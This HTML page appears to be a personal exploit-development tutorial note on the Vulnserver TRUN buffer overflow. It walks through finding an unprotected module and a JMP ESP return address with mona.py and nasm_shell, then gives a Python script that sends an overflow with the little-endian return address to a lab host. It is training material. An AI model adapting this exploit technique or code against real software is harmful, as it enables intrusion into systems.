<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Finding the Right Module</title>
</head><body>How to find the right module ?_?<br/>
So when we talk to find the right module we are looking for a TLL or something similarthat has no memory protection <br/>
no DEP<br/>
no Aslr <br/>
no safe SEH<br/>
<br/>
So there's a tool called Mona Modules that we can use with immunity debugger to achieve this <br/>
(i.e. <a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a>)<br/>
<br/>
We have paste the mona.py file in the following lcoation :<br/>
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands<br/>
<br/>
<img height="289" src="image.png" width="550"/><br/>
<br/>
<b>Immunity Debugger :!mona modules</b><br/>
<img height="104" src="rebade.png" width="600"/><br/>
<br/>
As we can the protection setting and it false for the essfunc.dll (i.e. we are looking for something that is attached to the Vulnserver)<br/>
<br/>
Now will find the Opcode equivalent to a JMP <br/>
We are trying to convert Assembly language into Hex code <br/>
Kali Linux :<br/>
┌──(root㉿kali)-[/home/kali]<br/>
└─# locate nasm_shell<br/>
/usr/bin/msf-nasm_shell<br/>
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb<br/>
                                                                              <br/>
┌──(root㉿kali)-[/home/kali]<br/>
└─# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb<br/>
<br/>
nasm &gt; JMP ESP<br/>
00000000 FFE4       jmp esp<br/>
nasm &gt; <br/>
<br/>
Now will take this information (i.e. FFE4 )<br/>
<br/>
Immunuty Debugger :<br/>
!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll<br/>
<br/>
We are looking for return addresses <br/>
<img height="122" src="rebade 2.png" width="550"/><br/>
<br/>
As we got the return pointer address as 625011af <br/>
We are writing the address in reverse for a special reason. So whene we are talking about X86 architecture <br/>
we are following something called Little Endian format.<br/>
X86 stores the lower order byte at the lowest address and the higher order byte at the highest address <br/>
Kali Linux :<br/>
<br/>
#!/usr/bin/python<br/>
import sys,socket <br/>
<br/>
#625011af<br/>
shellcode = &quot;A&quot; * 2003 + &quot;\xaf\x11\x50\x62&quot;<br/>
<br/>
try:<br/>
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)<br/>
		s.connect(('192.168.205.135',9999))<br/>
		<br/>
		s.send(('TRUN /.:/' + shellcode))<br/>
		#s.send(('TRUN /.:/' + offset))<br/>
		s.close()<br/>
except:<br/>
		print &quot;Error Connnecting To The Server&quot;<br/>
		sys.exit()<br/>
<br/>
Immuinty Debugger :<br/>
Press the arrow (i.e. Bluish Black ) and enter the return address (i.e. 625011af)<br/>
<img height="271" src="image 2.png" width="650"/><br/>
<br/>
Hit F2 and it will turn it blue (i.e. set a break-point as running)<br/>
We are going to overflow the buffer but if hit this specific spot it will break the program and it pause it till further instructions.<br/>
<br/>
<img height="280" src="image 3.png" width="600"/><br/>
<img height="210" src="image 4.png" width="450"/><br/>
<br/>
</body></html>